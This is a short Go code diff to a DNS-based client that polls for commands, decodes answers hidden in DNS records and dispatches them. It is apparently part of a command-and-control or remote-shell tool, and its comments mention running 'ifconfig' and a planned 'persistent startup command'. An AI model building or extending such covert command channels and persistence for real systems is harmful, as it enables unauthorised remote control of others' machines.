@@ -17,7 +17,6 @@ type messageType string
 const (
 	POLL   messageType = "poll"
 	ANSWER messageType = "answer"
-	ERROR  messageType = "error"
 	EXIT   messageType = "exit"
 )
 
@@ -68,14 +67,17 @@ func (d DNSClient) createMessage(commandType messageType, message string) *dns.M
 }
 
 func (d DNSClient) handleAnswer(answerMsg *dns.Msg) {
+	//answer to ifconfig seems to be too big to be sent in 1 msg
+	//todo: handle big answers
 	collect := d.messageSplitter.Collect(answerMsg.Extra)
+	if collect == "" {
+		return
+	}
 	decoded := d.encoder.Decode(collect)
 	fmt.Println(decoded)
 	d.handleDecodedCommand(decoded)
 }
 
-// todo: exit not working correctly
-// todo: add persistent startup command
 func (d DNSClient) handleDecodedCommand(decoded string) {
 	switch decoded {
 	case "idle":
